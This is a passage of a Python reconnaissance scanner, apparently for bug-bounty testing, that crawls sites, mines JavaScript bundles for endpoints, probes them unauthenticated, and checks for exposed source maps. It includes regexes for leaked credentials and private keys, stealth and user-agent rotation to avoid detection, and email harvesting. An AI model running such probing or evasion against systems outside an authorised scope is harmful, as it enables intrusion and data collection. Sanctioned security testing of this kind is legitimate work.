                        ctx = _js_context(js_text, comment[:40])
                        write_to_js_database(page_url, js_url, "comment_todo", clean, ctx)
                        findings += 1

        # Prototype pollution sink scan — first-party JS only, active-probes only
        if ACTIVE_PROBES:
            scan_js_for_prototype_pollution_sinks(page_url, js_url, js_text)

        if findings:
            print(timestamp() + " JS analysis: " + str(findings) + " findings in " + js_url)

    except Exception as e:
        print_error("analyse_js_bundle failed for " + js_url + ": " + str(e))

# Tracks all JS analysis threads so main_crawler can join them before the
# final endpoint probe (ensures all endpoints are in the DB before probing).
_js_analysis_threads = []
_js_analysis_threads_lock = threading.Lock()

# ── Graceful stop event — set by signal handler or stop API to halt all workers
_stop_event = threading.Event()

def extract_and_analyse_js(page_url, html_content):
    """Find all script src tags in a page and analyse each JS bundle."""
    try:
        soup = BeautifulSoup(html_content, "lxml")
        base = "{0.scheme}://{0.netloc}".format(urlparse(page_url))
        for tag in soup.find_all("script", src=True):
            src = tag["src"]
            if src.startswith("//"):
                src = "https:" + src
            elif src.startswith("/"):
                src = base + src
            elif not src.startswith("http"):
                continue
            # Skip obvious third-party analytics/tracking
            skip = ["google", "facebook", "twitter", "analytics", "gtag",
                    "hotjar", "intercom", "segment", "hubspot", "clarity"]
            if any(s in src for s in skip):
                continue
            t = threading.Thread(target=analyse_js_bundle, args=(page_url, src), daemon=True)
            t.start()
            with _js_analysis_threads_lock:
                _js_analysis_threads.append(t)
    except Exception as e:
        print_error("extract_and_analyse_js: " + str(e))

# ─────────────────────────────────────────────
# JS endpoint auto-probe
# ─────────────────────────────────────────────

# Response patterns that confirm sensitive data is being leaked
_JS_EP_SENSITIVE = [
    (re.compile(r'"password"\s*:\s*"[^"]{1,}"',     re.I), "password field with value"),
    (re.compile(r'"passwd"\s*:\s*"[^"]{1,}"',        re.I), "passwd field with value"),
    (re.compile(r'"secret"\s*:\s*"[^"]{8,}"',        re.I), "secret field with value"),
    (re.compile(r'"(?:api_?key|apikey)"\s*:\s*"[^"]{8,}"', re.I), "API key field"),
    (re.compile(r'"(?:access_?token|auth_?token|bearer_?token)"\s*:\s*"[^"]{8,}"', re.I), "auth token field"),
    (re.compile(r'"(?:ssn|social_security_?number)"\s*:', re.I), "SSN field"),
    (re.compile(r'"credit_?card(?:_?number)?"\s*:',  re.I), "credit card field"),
    (re.compile(r'-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY', re.I), "private key"),
    (re.compile(r'Traceback \(most recent call last\)', re.I), "Python stack trace"),
    (re.compile(r'at\s+[\w.$]+\s+\([\w./]+:\d+:\d+\)', re.I), "JS stack trace"),
    (re.compile(r'(?:SQLException|ORA-\d{5}|SQLSTATE\[|mysql_fetch|pg_query)', re.I), "SQL error"),
    (re.compile(r'"(?:is_admin|isAdmin)"\s*:\s*true', re.I), "admin:true flag"),
    (re.compile(r'"role"\s*:\s*"admin"',             re.I), "admin role"),
]

_js_endpoint_probed      = set()
_js_endpoint_probed_lock = threading.Lock()

def _resolve_endpoint(endpoint, page_url):
    """Convert a relative or protocol-relative endpoint to a full URL."""
    if endpoint.startswith(("http://", "https://")):
        return endpoint
    if endpoint.startswith("//"):
        scheme = urlparse(page_url).scheme or "https"
        return scheme + ":" + endpoint
    parsed = urlparse(page_url)
    origin = f"{parsed.scheme}://{parsed.netloc}"
    return origin + (endpoint if endpoint.startswith("/") else "/" + endpoint)

def probe_js_endpoints(base_url=None):
    """
    Probe all API endpoints stored in JSFindings (finding_type='endpoint')
    using unauthenticated GET requests.

    Severity mapping:
      HIGH   — HTTP 200 + sensitive data pattern (token, password field, stack trace, SQL error)
      MEDIUM — HTTP 200 + JSON array with >10 items (potential unauthenticated data dump)
      LOW    — HTTP 200 + JSON object (accessible without auth, verify manually)
      LOW    — HTTP 500 (server error on unauthenticated probe)
      skip   — HTTP 401/403 (exists but protected — expected)

    When base_url is provided, only probes endpoints whose resolved host matches
    that origin (used when called per-domain during enrichment).
    """
    try:
        conn = sqlite3.connect("ScrapeDB")
        rows = conn.execute(
            "SELECT value, url FROM JSFindings WHERE finding_type='endpoint'"
        ).fetchall()
        conn.close()
    except Exception as e:
        print_error(f"probe_js_endpoints: DB query failed: {e}")
        return

    if not rows:
        return

    base_netloc = urlparse(base_url).netloc if base_url else None

    to_probe = []
    seen_this_call = set()
    for endpoint, page_url in rows:
        try:
            full_url = _resolve_endpoint(endpoint, page_url or "")
            if not full_url.startswith("http"):
                continue
            with _js_endpoint_probed_lock:
                already = full_url in _js_endpoint_probed
            if already or full_url in seen_this_call:
                continue
            if base_netloc and urlparse(full_url).netloc != base_netloc:
                continue
            if not is_in_scope(full_url):
                continue
            seen_this_call.add(full_url)
            to_probe.append((full_url, page_url))
        except Exception:
            continue

    if not to_probe:
        return

    print(timestamp() + f" Probing {len(to_probe)} JS-discovered endpoints unauthenticated...")

    def _probe(full_url, page_url):
        if _stop_event.is_set():
            return
        with _js_endpoint_probed_lock:
            _js_endpoint_probed.add(full_url)
        try:
            resp = safe_get(full_url, timeout=8)
            if not resp:
                return
            status = resp.status_code

            if status == 200:
                body  = resp.text
                size  = len(body)
                ctype = resp.headers.get("Content-Type", "").lower()

                # Sensitive data patterns — HIGH
                for pattern, desc in _JS_EP_SENSITIVE:
                    if pattern.search(body):
                        alert("JS ENDPOINT — SENSITIVE DATA EXPOSED", "HIGH", full_url,
                              f"Unauthenticated GET returned HTTP 200 containing {desc}")
                        print(timestamp() + f" [!!] JS endpoint leaks {desc}: {full_url}")
                        return

                # Email addresses in response — severity based on count and specificity
                _GENERIC_PREFIXES = {'support', 'info', 'admin', 'contact', 'hello', 'noreply',
                                     'no-reply', 'help', 'sales', 'team'}
                found_emails = [e for e in re.findall(r'[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}', body)
                                if _is_real_email(e)]
                unique_emails = list(set(found_emails))
                non_generic = [e for e in unique_emails if e.split('@')[0].lower() not in _GENERIC_PREFIXES]
                if len(non_generic) >= 3:
                    alert("JS ENDPOINT — SENSITIVE DATA EXPOSED", "HIGH", full_url,
                          f"Unauthenticated GET returned {len(non_generic)} non-generic email addresses")
                    print(timestamp() + f" [!!] JS endpoint exposes email list ({len(non_generic)} addresses): {full_url}")
                    return
                elif len(non_generic) >= 1:
                    alert("JS ENDPOINT — SENSITIVE DATA EXPOSED", "MEDIUM", full_url,
                          f"Unauthenticated GET returned {len(non_generic)} non-generic email address(es)")
                    print(timestamp() + f"  JS endpoint exposes email(s) ({len(non_generic)} non-generic): {full_url}")
                    return
                elif len(unique_emails) >= 5:
                    alert("JS ENDPOINT — SENSITIVE DATA EXPOSED", "LOW", full_url,
                          f"Unauthenticated GET returned {len(unique_emails)} generic/public email addresses")
                    print(timestamp() + f"  JS endpoint exposes generic emails ({len(unique_emails)}): {full_url}")
                    return

                # Large JSON array — potential data dump — MEDIUM
                stripped = body.strip()
                if stripped.startswith("["):
                    try:
                        data = json.loads(stripped)
                        if isinstance(data, list) and len(data) > 10:
                            alert("JS ENDPOINT — UNAUTHENTICATED DATA ACCESS", "MEDIUM", full_url,
                                  f"Unauthenticated GET returned JSON array with {len(data)} items ({size:,} bytes)")
                            print(timestamp() + f"  JS endpoint data dump ({len(data)} items): {full_url}")
                            return
                    except Exception:
                        pass

                # JSON object response — LOW
                if size > 128 and ("json" in ctype or stripped.startswith("{")):
                    alert("JS ENDPOINT — ACCESSIBLE UNAUTHENTICATED", "LOW", full_url,
                          f"Unauthenticated GET returned HTTP 200 JSON ({size:,} bytes) — verify auth requirement")

            elif status == 500:
                alert("JS ENDPOINT — SERVER ERROR", "LOW", full_url,
                      "Unauthenticated GET returned HTTP 500 — possible unhandled exception or missing input validation")

        except requests.exceptions.Timeout:
            pass
        except Exception as e:
            print_error(f"probe_js_endpoints: probe failed for {full_url}: {e}")

    from concurrent.futures import ThreadPoolExecutor, as_completed
    with ThreadPoolExecutor(max_workers=8) as ex:
        futures = [ex.submit(_probe, url, page) for url, page in to_probe]
        for f in as_completed(futures):
            pass
    print(timestamp() + f" JS endpoint probe complete — {len(to_probe)} probed.")


# ─────────────────────────────────────────────
# JavaScript source map exposure
# ─────────────────────────────────────────────

# Deduplicate across the session — each JS URL checked at most once
_source_map_checked = set()

def check_js_source_map(page_url, js_url, js_response=None):
    """
    Probe for exposed JavaScript source maps.

    Checks:
      1. SourceMap / X-SourceMap response header on the JS file itself
         (explicitly points to the map location — most authoritative)
      2. <js_url>.map — the conventional naming convention used by all
         major bundlers (webpack, esbuild, Rollup, Vite, Parcel)

    Exposed source maps leak the original unminified source code, internal
    file paths, variable/function names, and occasionally inline comments
    that contain credentials or architecture notes.

    Confirmation: response body must contain the required JSON fields
    ("version", "mappings", "sources") to avoid false positives from
    catch-all 200 handlers.
    """
    if js_url in _source_map_checked:
        return
    _source_map_checked.add(js_url)

    map_candidates = []

    # Priority 1: explicit header reference
    if js_response:
        for header in ("SourceMap", "X-SourceMap"):
            ref = js_response.headers.get(header) or js_response.headers.get(header.lower())
            if ref:
                if ref.startswith("http"):
                    map_candidates.append(ref)
                else:
                    base = js_url.rsplit("/", 1)[0]
                    map_candidates.append(base + "/" + ref.lstrip("/"))

    # Priority 2: conventional .map path
    map_candidates.append(js_url + ".map")

    seen = set()
    for map_url in map_candidates:
        if map_url in seen:
            continue
        seen.add(map_url)
        try:
            stealth_delay(urlparse(map_url).netloc)
            resp = _get_session().get(
                map_url, headers=create_request_header(),
                timeout=6, allow_redirects=False,
            )
            if not resp or resp.status_code not in (200, 206):
                continue

            # Confirm it's a real source map — must have all three required fields
            body = resp.text[:4000]
            if not ('"version"' in body and '"mappings"' in body and '"sources"' in body):
                continue

            # Extract source file list for the alert detail (first 3 paths)
            source_files = re.findall(r'"sources"\s*:\s*\[([^\]]{0,300})', body)
            detail_suffix = ""
            if source_files:
                paths = re.findall(r'"([^"]{3,80})"', source_files[0])[:3]
                if paths:
                    detail_suffix = " — source paths include: " + ", ".join(paths)

            alert(
                "JAVASCRIPT SOURCE MAP EXPOSED",
                "HIGH",
                js_url,
                f"Source map at {map_url} leaks unminified source, file paths, and variable names{detail_suffix}"
            )
            print(timestamp() + f" [!!] JS source map exposed: {map_url}")
            write_to_js_database(page_url, js_url, "source_map", map_url)

        except Exception as e:
            print_error(f"check_js_source_map failed for {map_url}: {e}")

# ─────────────────────────────────────────────
# Playwright JS rendering
# ─────────────────────────────────────────────

# Per-thread persistent browser — each thread owns one browser for its lifetime
_pw_semaphore      = threading.Semaphore(PLAYWRIGHT_MAX_CONC)
_pw_local          = threading.local()
_pw_instances_lock = threading.Lock()
_pw_instances: list = []   # [(pw, browser), …] — one entry per thread that spawned a browser


def _shutdown_playwright() -> None:
    """Close all Playwright browser instances and stop the Node.js process cleanly.

    Iterates over every (pw, browser) pair registered in _pw_instances and shuts
    each one down gracefully. Called on SIGINT, SIGTERM, and at normal crawler exit
    to prevent the Node.js subprocess from receiving a write to a closed pipe
    ('write EPIPE') when Python exits while Playwright is still running.
    """
    if not PLAYWRIGHT_AVAILABLE:
        return
    with _pw_instances_lock:
        instances = list(_pw_instances)
        _pw_instances.clear()
    for pw, browser in instances:
        try:
            browser.close()
        except Exception:
            pass
        try:
            pw.stop()
        except Exception:
            pass


def _get_pw_thread_browser():
    """Return the per-thread Playwright browser, launching it on first use."""
    if not getattr(_pw_local, 'browser', None):
        import os
        exe = os.environ.get("PLAYWRIGHT_CHROMIUM_EXECUTABLE_PATH", None)
        pw  = sync_playwright().start()
        browser = pw.chromium.launch(
            executable_path=exe,
            headless=True,
            args=[
                "--no-sandbox",
                "--disable-dev-shm-usage",
                "--disable-gpu",
                "--single-process",
            ],
        )
        _pw_local.pw      = pw
        _pw_local.browser = browser
        with _pw_instances_lock:
            _pw_instances.append((pw, browser))
    return _pw_local.browser

# JS frameworks that definitely need Playwright
JS_FRAMEWORKS = {"React", "Angular", "Vue.js", "Next.js", "Nuxt.js", "Gatsby", "Svelte"}

def is_js_heavy(html_bytes, detected_techs=None):
    """
    Returns True if the page is likely a JS-rendered SPA that needs Playwright.
    Checks:
      1. Known JS framework in detected_techs
      2. Very little visible text vs total HTML size (SPA shell pattern)
      3. Presence of common SPA root mount points with no content
    """
    if detected_techs and JS_FRAMEWORKS.intersection(set(detected_techs)):
        return True
    if not html_bytes or len(html_bytes) < JS_CONTENT_MIN:
        return True
    try:
        soup = BeautifulSoup(html_bytes, "lxml")
        for tag in soup(["script", "style", "noscript"]):
            tag.decompose()
        text = soup.get_text(separator=" ").strip()
        # If visible text is less than 5% of total HTML, it's probably a shell
        if len(text) < len(html_bytes) * 0.05:
            return True
        # Common SPA mount point patterns with no children
        for mount_id in ["root", "app", "__next", "__nuxt", "gatsby-focus-wrapper"]:
            el = soup.find(id=mount_id)
            if el and not el.get_text(strip=True):
                return True
    except Exception:
        pass
    return False

def write_to_xhr_database(page_url, endpoint, method):
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        create_db(conn, "XHREndpoints")
        existing = conn.execute(
            "SELECT url FROM XHREndpoints WHERE url=? AND endpoint=? LIMIT 1",
            (page_url, endpoint)).fetchone()
        if not existing:
            conn.execute(
                "INSERT INTO XHREndpoints (url,endpoint,method,found_at) VALUES (?,?,?,?)",
                (page_url, endpoint, method, timestamp()))
    except Exception as e:
        print_error("write_to_xhr_database: " + str(e))
    finally:
        conn.close()

def playwright_fetch(url):
    """
    Render a page with Playwright using a per-thread persistent browser instance.
    Each thread initializes its own browser on first use and reuses it for all
    subsequent calls, avoiding the 5-8s cold-start per page.
    Returns (html_bytes, xhr_endpoints).
    """
    if not PLAYWRIGHT_AVAILABLE:
        print_error("Playwright not installed — run: pip install playwright && playwright install chromium")
        return None, []

    xhr_endpoints = []
    html_bytes    = None

    with _pw_semaphore:
        ctx  = None
        page = None
        try:
            browser = _get_pw_thread_browser()
            print(timestamp() + " Playwright rendering: " + url)
            _ctx_headers = stealth_headers({})
            _ctx_extra = {k: v for k, v in _ctx_headers.items() if k != "User-Agent"}
            if BUG_BOUNTY_HEADER:
                _ctx_extra["X-Bug-Bounty"] = BUG_BOUNTY_HEADER
            ctx  = browser.new_context(
                user_agent=random.choice(UA_POOL),
                extra_http_headers=_ctx_extra,
                ignore_https_errors=True,
                java_script_enabled=True,
            )
            page = ctx.new_page()
            if PLAYWRIGHT_STEALTH_AVAILABLE:
                Stealth().apply_stealth_sync(page)

            def on_request(req):
                if req.resource_type in ("xhr", "fetch"):
                    skip = ["google-analytics", "googletagmanager", "facebook",
                            "doubleclick", "hotjar", "segment", "mixpanel",
                            "amplitude", "intercom", "hubspot", "clarity.ms"]
                    if not any(s in req.url for s in skip):
                        xhr_endpoints.append((req.url, req.method))
                        print(timestamp() + " XHR: " + req.method + " " + req.url)

            page.on("request", on_request)

            page.goto(url, timeout=PLAYWRIGHT_TIMEOUT, wait_until="domcontentloaded")
            try:
                page.wait_for_load_state("networkidle", timeout=4000)
            except PlaywrightTimeout:
                pass

            for _ in range(4):
                page.evaluate("window.scrollBy(0, window.innerHeight)")
                page.wait_for_timeout(500)
            page.evaluate("window.scrollTo(0, 0)")

            html_bytes = page.content().encode("utf-8", errors="ignore")
            print(timestamp() + " Playwright got " + str(len(html_bytes)) + " bytes from " + url)

        except PlaywrightTimeout:
            print_error("Playwright page timeout: " + url)
        except Exception as e:
            print_error("Playwright page error on " + url + ": " + str(e))
        finally:
            if page:
                try:
                    page.close()
                except Exception:
                    pass
            if ctx:
                try:
                    ctx.close()
                except Exception:
                    pass

    return html_bytes, xhr_endpoints

# ─────────────────────────────────────────────
# Async crawler
# ─────────────────────────────────────────────

async def async_fetch(session, url, semaphore):
    async with semaphore:
        _t0 = time.monotonic()
        try:
            if STEALTH_PROFILE == "NORMAL":
                await asyncio.sleep(random.uniform(0.5, 1.5))
            elif STEALTH_PROFILE == "GHOST":
                await asyncio.sleep(random.uniform(2.0, 6.0))
            headers = create_request_header()
            timeout = aiohttp.ClientTimeout(total=ASYNC_TIMEOUT, connect=5)
            async with session.get(url, headers=headers, timeout=timeout) as response:
                status = response.status
                record_http_response(url, status)
                if status == 429:
                    elapsed = time.monotonic() - _t0
                    await asyncio.sleep(random.uniform(RATE_LIMIT_MIN, RATE_LIMIT_MAX))
                    return url, None, {}, elapsed, True, True   # (url, html, hdrs, elapsed, is_error, is_429)
                if status == 200:
                    content_type = response.headers.get('Content-Type', '')
                    if 'xml' in content_type and 'html' not in content_type:
                        elapsed = time.monotonic() - _t0
                        await asyncio.sleep(random.uniform(RATE_LIMIT_MIN, RATE_LIMIT_MAX))
                        return url, None, {}, elapsed, False, False
                    html = await response.read()
                    elapsed = time.monotonic() - _t0
                    await asyncio.sleep(random.uniform(RATE_LIMIT_MIN, RATE_LIMIT_MAX))
                    return url, html, dict(response.headers), elapsed, False, False
        except asyncio.TimeoutError:
            print_error("Timeout fetching: " + url)
        except aiohttp.ClientError as e:
            print_error("Async fetch failed for " + url + ": " + str(e))
        except Exception as e:
            print_error("Unexpected error fetching " + url + ": " + str(e))
        elapsed = time.monotonic() - _t0
        await asyncio.sleep(random.uniform(RATE_LIMIT_MIN, RATE_LIMIT_MAX))
        return url, None, {}, elapsed, True, False

async def crawl_batch(urls, concurrency=None):
    if concurrency is None:
        concurrency = _ac.workers
    semaphore = asyncio.Semaphore(max(1, concurrency))
    connector = aiohttp.TCPConnector(ssl=False)
    async with aiohttp.ClientSession(
        connector=connector,
        max_line_size=32768,
        max_field_size=32768,
    ) as session:
        tasks = [async_fetch(session, url, semaphore) for url in urls]
        return await asyncio.gather(*tasks, return_exceptions=False)

def parse_anchors_from_html(html_content):
    try:
        parsed = BeautifulSoup(html_content, "lxml")
        return parsed.find_all(lambda tag: tag.name == 'a' and tag.get('href'))
    except Exception:
        return []

def load_hackerone_scope(csv_path: str) -> tuple:
    """
    Parse a HackerOne scope CSV and return (includes, excludes) as lists of
    compiled hostname-matching regex patterns.

    Expected columns: asset_identifier, asset_type, instruction, max_severity
    Only rows with asset_type URL, WILDCARD, or DOMAIN are processed.

    Pattern construction:
      *.example.com  →  ^(?:.+\\.)?example\\.com$   (matches example.com and all subdomains)
      example.com    →  ^example\\.com$              (exact hostname match)
    """
    import csv as _csv
    includes: list = []
    excludes: list = []
    try:
        with open(csv_path, newline="", encoding="utf-8-sig") as f:
            reader = _csv.DictReader(f)
            for row in reader:
                asset_type  = (row.get("asset_type") or "").strip().upper()
                if asset_type not in ("URL", "WILDCARD", "DOMAIN"):
                    continue
                identifier  = (row.get("asset_identifier") or "").strip()
                instruction = (row.get("instruction") or "").strip().lower()
                if not identifier:
                    continue
                # Extract hostname from URL-type assets
                if asset_type == "URL":
                    if "://" not in identifier:
                        identifier = "https://" + identifier
                    host = urlparse(identifier).netloc or identifier
                else:
                    host = identifier
                # Build regex: wildcard prefix → match domain and all subdomains
                if host.startswith("*."):
                    bare    = re.escape(host[2:])
                    pattern = re.compile(r'^(?:.+\.)?' + bare + r'$', re.IGNORECASE)
                else:
                    host    = host.lstrip("*.")
                    bare    = re.escape(host)
                    pattern = re.compile(r'^' + bare + r'$', re.IGNORECASE)
                if instruction == "exclude":
                    excludes.append(pattern)
                else:
                    includes.append(pattern)
        print(f"[scope] Loaded {len(includes)} in-scope and {len(excludes)} excluded "
              f"pattern(s) from {csv_path}")
    except Exception as exc:
        print(f"[scope] Failed to load scope file '{csv_path}': {exc}")
    return includes, excludes


def is_in_scope(url):
    """
    Return True if url is within the current scan scope.

    Priority order:
      1. HackerOne exclude patterns (--scope) always win — returns False.
      2. If HackerOne include patterns are loaded, the URL must match the start
         domain or one of the include patterns — returns False otherwise.
      3. If --same-domain-only is set, the URL must be on the start domain.
      4. Default: all URLs are in scope.
    """
    try:
        url_host = urlparse(url).netloc.lstrip("www.")
    except Exception:
        return False

    # 1. Excludes always win
    for pat in HO_EXCLUDE_PATTERNS:
        if pat.match(url_host):
            return False

    # 2. If include patterns are loaded, restrict to start domain + includes
    if HO_INCLUDE_PATTERNS:
        try:
            target_host = urlparse(START_URL).netloc.lstrip("www.")
        except Exception:
            target_host = ""
        if target_host and (url_host == target_host or url_host.endswith("." + target_host)):
            return True
        for pat in HO_INCLUDE_PATTERNS:
            if pat.match(url_host):
                return True
        return False

    # 3. Default same-domain-only check
    if not SAME_DOMAIN_ONLY:
        return True
    try:
        target_host = urlparse(START_URL).netloc.lstrip("www.")
        return url_host == target_host or url_host.endswith("." + target_host)
    except Exception:
        return False

def _clean_url(url):
    """Strip trailing punctuation that can bleed into URLs from surrounding text."""
    return url.rstrip(")>]")

def get_domain_names(anchors, url_queue, url_seen, base_netloc, same_domain_only):
    new_domains = []
    try:
        for a in anchors:
            href = _clean_url(a.get("href", ""))
            if not href.startswith("http"):
                continue
            if href in url_seen:
                continue
            parsed_href = urlparse(href)
            if same_domain_only and parsed_href.netloc != base_netloc:
                continue
            if SOCIAL_FILTER_FLAGS["enabled"] and is_social_media_domain(href):
                continue
            if SKIP_GOOGLE_TRACKING and is_google_tracking_url(href):
                continue
            url_seen.add(href)
            priority = _url_priority(href)
            _pq_push(url_queue, href)
            if priority == 1:
                print(timestamp() + " [P1] High-value URL queued: " + href)
            if href.endswith((".com", ".gov/", ".net/", ".edu/", ".org/",
                               ".io/", ".co.uk/", ".ie/", ".info/")):
                new_domains.append(href)
    except TypeError as err:
        print_error("get_domain_names: " + str(err))
    return new_domains

# ─────────────────────────────────────────────
# Database
# ─────────────────────────────────────────────

def create_db(conn, table_name):
    table_creation_map = {
        "Domains":         '''CREATE TABLE IF NOT EXISTS Domains (url TEXT NOT NULL, ip TEXT NOT NULL, servertype TEXT, content_type TEXT, title TEXT)''',
        "Emails":          '''CREATE TABLE IF NOT EXISTS Emails (email_address TEXT NOT NULL)''',
        "DNS":             '''CREATE TABLE IF NOT EXISTS DNS (domain TEXT NOT NULL, ip TEXT NOT NULL)''',
        "MX":              '''CREATE TABLE IF NOT EXISTS MX (domain TEXT NOT NULL, mx_host TEXT NOT NULL, preference INTEGER)''',
        "SSL":             '''CREATE TABLE IF NOT EXISTS SSL (domain TEXT NOT NULL, common_name TEXT, issuer TEXT, not_before TEXT, not_after TEXT)''',
        "WHOIS":           '''CREATE TABLE IF NOT EXISTS WHOIS (domain TEXT NOT NULL, registrar TEXT, creation_date TEXT, expiration_date TEXT)''',
        "Ports":           '''CREATE TABLE IF NOT EXISTS Ports (domain TEXT NOT NULL, ip TEXT NOT NULL, port INTEGER NOT NULL)''',
        "HTTPHistory":     '''CREATE TABLE IF NOT EXISTS HTTPHistory (url TEXT NOT NULL, status_code INTEGER NOT NULL, checked_at TEXT NOT NULL)''',
        "Technologies":    '''CREATE TABLE IF NOT EXISTS Technologies (url TEXT NOT NULL, technology TEXT NOT NULL)''',
        "Robots":          '''CREATE TABLE IF NOT EXISTS Robots (base_url TEXT NOT NULL, content TEXT NOT NULL, fetched_at TEXT NOT NULL)''',
        "Sitemap":         '''CREATE TABLE IF NOT EXISTS Sitemap (base_url TEXT NOT NULL, url TEXT NOT NULL)''',
        "SecurityHeaders": '''CREATE TABLE IF NOT EXISTS SecurityHeaders (
                                domain      TEXT NOT NULL,
                                present     TEXT,
                                missing     TEXT,
                                leaking     TEXT,
                                checked_at  TEXT NOT NULL
                             )''',
        "JSFindings":      '''CREATE TABLE IF NOT EXISTS JSFindings (
                                url         TEXT NOT NULL,
                                js_url      TEXT NOT NULL,
                                finding_type TEXT NOT NULL,
                                value       TEXT NOT NULL,
                                context     TEXT,
                                found_at    TEXT NOT NULL
                             )''',
        "XHREndpoints":    '''CREATE TABLE IF NOT EXISTS XHREndpoints (
                                url         TEXT NOT NULL,
                                endpoint    TEXT NOT NULL,
                                method      TEXT,
                                found_at    TEXT NOT NULL
                             )''',
        "Subdomains":      '''CREATE TABLE IF NOT EXISTS Subdomains (
                                root_domain TEXT NOT NULL,
                                subdomain   TEXT NOT NULL,
                                ip          TEXT,
                                status_code INTEGER,
                                found_at    TEXT NOT NULL
                             )''',
        "ASN":             '''CREATE TABLE IF NOT EXISTS ASN (
                                ip          TEXT NOT NULL,
                                asn         TEXT,
                                org         TEXT,
                                country     TEXT,
                                is_cdn      INTEGER DEFAULT 0,
                                cdn_name    TEXT,
                                looked_up   TEXT NOT NULL
                             )''',
        "ZoneTransfer":    '''CREATE TABLE IF NOT EXISTS ZoneTransfer (
                                root_domain TEXT NOT NULL,
                                nameserver  TEXT NOT NULL,
                                record      TEXT NOT NULL,
                                found_at    TEXT NOT NULL
                             )''',
        "WAF":             '''CREATE TABLE IF NOT EXISTS WAF (
                                domain      TEXT NOT NULL,
                                waf_vendor  TEXT NOT NULL,
                                detected_by TEXT,
                                found_at    TEXT NOT NULL
                             )''',
        "WellKnown":       '''CREATE TABLE IF NOT EXISTS WellKnown (
                                domain          TEXT NOT NULL,
                                path            TEXT NOT NULL,
                                category        TEXT,
                                content_snippet TEXT,
                                found_at        TEXT NOT NULL
                             )''',
        "WebSockets":      '''CREATE TABLE IF NOT EXISTS WebSockets (
                                page_url        TEXT NOT NULL,
                                ws_url          TEXT NOT NULL,
                                encrypted       INTEGER DEFAULT 0,
                                found_at        TEXT NOT NULL
                             )''',
        "ReverseDNS":      '''CREATE TABLE IF NOT EXISTS ReverseDNS (
                                ip              TEXT NOT NULL,
                                hostname        TEXT NOT NULL,
                                found_at        TEXT NOT NULL
                             )''',
        "ASNPrefixes":     '''CREATE TABLE IF NOT EXISTS ASNPrefixes (
                                asn             TEXT NOT NULL,
                                org             TEXT,
                                prefix          TEXT NOT NULL,
                                found_at        TEXT NOT NULL
                             )''',
    }
    if table_name in table_creation_map:
        try:
            conn.execute(table_creation_map[table_name])
        except sqlite3.OperationalError as err:
            print_error(str(err))

def check_db_for_domain(conn, name, table_name):
    table_checks = {
        "Domains": "SELECT url FROM Domains WHERE url=? LIMIT 1",
        "Emails":  "SELECT email_address FROM Emails WHERE email_address=? LIMIT 1",
    }
    sql = table_checks.get(table_name)
    if not sql:
        return True
    try:
        row = conn.execute(sql, (name,)).fetchone()
        return row is None
    except Exception:
        return True

def write_to_domain_database(name, ip, server, content_type, title):
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        create_db(conn, "Domains")
        if check_db_for_domain(conn, name, "Domains"):
            conn.execute(
                "INSERT INTO Domains (url,ip,servertype,content_type,title) VALUES (?,?,?,?,?)",
                (name, ip, server, content_type, title))
            print(timestamp() + " Saved domain: " + name)
    except Exception as e:
        print_error("write_to_domain_database: " + str(e))
    finally:
        conn.close()

def write_to_email_database(email_address):
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        create_db(conn, "Emails")
        if check_db_for_domain(conn, email_address, "Emails"):
            conn.execute("INSERT INTO Emails (email_address) VALUES (?)", (email_address,))
            print(timestamp() + " Saved email: " + email_address)
    except Exception as e:
        print_error("write_to_email_database: " + str(e))
    finally:
        conn.close()

def write_to_dns_database(domain, ip):
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        create_db(conn, "DNS")
        conn.execute("INSERT INTO DNS (domain,ip) VALUES (?,?)", (domain, ip))
    except Exception as e:
        print_error("write_to_dns_database: " + str(e))
    finally:
        conn.close()

def write_to_mx_database(domain, mx_host, preference):
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        create_db(conn, "MX")
        conn.execute("INSERT INTO MX (domain,mx_host,preference) VALUES (?,?,?)", (domain, mx_host, preference))
    except Exception as e:
        print_error("write_to_mx_database: " + str(e))
    finally:
        conn.close()

def write_to_ssl_database(domain, common_name, issuer, not_before, not_after):
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        create_db(conn, "SSL")
        conn.execute(
            "INSERT INTO SSL (domain,common_name,issuer,not_before,not_after) VALUES (?,?,?,?,?)",
            (domain, common_name, issuer, not_before, not_after))
    except Exception as e:
        print_error("write_to_ssl_database: " + str(e))
    finally:
        conn.close()

def write_to_whois_database(domain, registrar, creation_date, expiration_date):
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        create_db(conn, "WHOIS")
        conn.execute(
            "INSERT INTO WHOIS (domain,registrar,creation_date,expiration_date) VALUES (?,?,?,?)",
            (domain, registrar, creation_date, expiration_date))
    except Exception as e:
        print_error("write_to_whois_database: " + str(e))
    finally:
        conn.close()

def write_to_ports_database(domain, ip, port):
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        create_db(conn, "Ports")
        conn.execute("INSERT INTO Ports (domain,ip,port) VALUES (?,?,?)", (domain, ip, port))
    except Exception as e:
        print_error("write_to_ports_database: " + str(e))
    finally:
        conn.close()

def write_to_http_history_database(url, status_code):
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        create_db(conn, "HTTPHistory")
        conn.execute(
            "INSERT INTO HTTPHistory (url,status_code,checked_at) VALUES (?,?,?)",
            (url, status_code, timestamp()))
    except Exception as e:
        print_error("write_to_http_history_database: " + str(e))
    finally:
        conn.close()

def write_to_tech_database(url, technology):
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        create_db(conn, "Technologies")
        conn.execute("INSERT INTO Technologies (url,technology) VALUES (?,?)", (url, technology))
    except Exception as e:
        print_error("write_to_tech_database: " + str(e))
    finally:
        conn.close()

def write_to_robots_database(base_url, content):
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        create_db(conn, "Robots")
        conn.execute(
            "INSERT INTO Robots (base_url,content,fetched_at) VALUES (?,?,?)",
            (base_url, content, timestamp()))
    except Exception as e:
        print_error("write_to_robots_database: " + str(e))
    finally:
        conn.close()

def write_to_sitemap_database(base_url, url):
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        create_db(conn, "Sitemap")
